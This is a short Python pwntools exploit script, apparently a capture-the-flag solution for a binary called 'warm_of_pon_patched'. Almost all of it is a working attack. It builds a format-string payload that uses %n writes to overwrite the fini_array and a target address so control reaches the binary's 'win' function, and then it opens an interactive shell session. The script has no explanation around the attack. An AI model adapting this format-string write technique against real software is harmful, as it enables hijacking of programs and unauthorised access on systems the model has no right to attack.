#!/usr/bin/python3

from pwn import *

exe = ELF('warm_of_pon_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x40124F 

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()

target = 0x00404070
main = 0x4011DD
fini_array = 0x403DF0
offset = target-fini_array

payload = f"%{offset}c%36$n%{exe.sym.win-offset}c%13$n".encode().ljust(0x28,b"a")+p64(target)
sl(payload)

p.interactive()
